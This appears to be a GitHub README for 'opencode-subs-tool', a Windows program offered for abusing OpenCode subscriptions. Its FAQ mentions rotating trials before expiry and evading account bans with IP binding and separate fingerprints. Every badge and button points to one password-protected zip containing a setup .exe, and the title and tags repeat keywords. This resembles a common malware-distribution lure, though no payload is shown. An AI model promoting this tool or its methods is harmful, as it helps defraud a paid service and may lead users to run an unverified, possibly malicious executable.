<div align="center">

# OpenCode Sub Abuse — OpenCode Sub Abuse — Opencode Sub Abuse (One-Command Setup, Prebuilt Release)

<p><strong>OpenCode Sub Abuse — OpenCode Sub Abuse — Opencode Sub Abuse (One-Command Setup, Prebuilt Release): OpenCode Sub Abuse — opencode and abuse in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/opencode-subs-tool-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/opencode-subs-tool-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/opencode-subs-tool-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/opencode-subs-tool?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/opencode-subs-tool-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download opencode-subs-tool-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/opencode-subs-tool-v0.1.0-win64.zip"><img src="banner.svg" alt="OpenCode Sub Abuse Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**OpenCode Sub Abuse — OpenCode Sub Abuse — opencode and abuse in one tool** (`opencode-subs-tool`) ships as a native 64-bit Windows build with a prebuilt portable release. Everything is driven by `config/settings.json` — hot-reloadable, dependency-free, and tuned for a minimal runtime footprint.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`opencode-subs-tool-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/opencode-subs-tool-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`opencode-subs-tool-v0.1.0-win64.zip`](../../releases/download/v0.1.0/opencode-subs-tool-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `OpencodeSubsTool_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## FAQ

<details>
<summary><b>Accounts burned?</b></summary>

IP binding + separate fingerprints.
</details>
<details>
<summary><b>Trials?</b></summary>

Rotation before expiry.
</details>
<details>
<summary><b>Data?</b></summary>

All local.
</details>

## Documentation & Guides

- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [Usage Guide — commands and options](docs/USAGE.md)

## Configuration (`config/settings.json`)

```json
{
  "module": "opencode-subs-tool",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "accounts": {
      "enabled": true
    },
    "trials": {
      "enabled": true
    },
    "keeper": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

## Building from Source

```bash
git clone https://github.com/TestOwner/opencode-subs-tool.git
cd opencode-subs-tool
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: opencode-subs-tool, subscription, abuse, multi, tool, free, ai-tools, automation, opencode, cli, developer-tools, open-source, windows, productivity, cpp, portable, prebuilt, tools</sub>
